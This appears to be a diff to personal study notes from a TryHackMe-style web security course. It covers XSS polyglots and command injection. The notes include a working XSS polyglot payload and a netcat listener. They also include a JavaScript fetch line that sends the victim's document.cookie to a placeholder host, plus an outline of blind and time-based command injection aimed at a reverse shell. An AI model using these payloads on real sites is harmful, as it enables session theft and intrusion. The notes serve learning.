@@ -176,3 +176,21 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
+
+* nc -nlvp 9001 (listen) -> steal cookie
+* `fetch('http://ip:9001?cookie=' + btoa(document.cookie));`
+
+---
+
+* Remote Code Execution (RCE) - command injection => goal: get a reverse shell
+* https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report
+  * Example: a code that call a command (ex: grep) using user input
+* Blind
+  * Force input: >, -o...
+  * Time-based: ping/sleep
+* Regular
+* Commands
+  * L: whoami id nc
+  * W: whoami dir ping timeout
+* sanitisation = check the format (ex: number, email...). Filters can be bypassed (ex: hexadecimal...).
+* https://github.com/payloadbox/command-injection-payload-list
